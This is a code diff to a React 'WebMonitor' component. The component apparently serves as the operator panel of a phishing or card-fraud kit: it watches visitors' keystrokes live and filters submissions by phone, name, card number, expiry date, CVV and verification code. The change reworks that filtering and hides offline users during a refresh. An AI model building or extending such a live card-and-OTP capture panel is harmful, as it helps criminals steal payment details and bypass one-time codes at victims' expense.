@@ -244,22 +244,30 @@ export function WebMonitor() {
   const { submissions, isFieldTyping, getFieldValue, isSubmitting } = useKeystrokeMonitor(submissionData);
 
   // 过滤数据逻辑
-  const filteredSubmissions = hideEmptyData
-    ? submissions.filter(submission => {
-        const hasUserData = submission.realtimeInput && (
-          submission.realtimeInput.phone ||
-          submission.realtimeInput.cardNumber ||
-          submission.realtimeInput.expiryDate ||
-          submission.realtimeInput.cvv ||
-          submission.realtimeInput.verificationCode ||
-          submission.userName
-        );
-        const hasActiveTyping = ['phone', 'name', 'cardNumber', 'expiryDate', 'cvv', 'verificationCode'].some(field =>
-          isFieldTyping(submission.id, field)
-        );
-        return hasUserData || hasActiveTyping;
-      })
-    : submissions;
+  let filteredSubmissions = submissions;
+
+  // 如果正在刷新，临时隐藏离线用户
+  if (isRefreshing) {
+    filteredSubmissions = filteredSubmissions.filter(submission => !submission.isOffline);
+  }
+
+  // 如果开启隐藏无数据选项
+  if (hideEmptyData) {
+    filteredSubmissions = filteredSubmissions.filter(submission => {
+      const hasUserData = submission.realtimeInput && (
+        submission.realtimeInput.phone ||
+        submission.realtimeInput.cardNumber ||
+        submission.realtimeInput.expiryDate ||
+        submission.realtimeInput.cvv ||
+        submission.realtimeInput.verificationCode ||
+        submission.userName
+      );
+      const hasActiveTyping = ['phone', 'name', 'cardNumber', 'expiryDate', 'cvv', 'verificationCode'].some(field =>
+        isFieldTyping(submission.id, field)
+      );
+      return hasUserData || hasActiveTyping;
+    });
+  }
 
   const onlineCount = filteredSubmissions.filter(s => s.status === "processing").length;
   const todaySubmissions = filteredSubmissions.length;
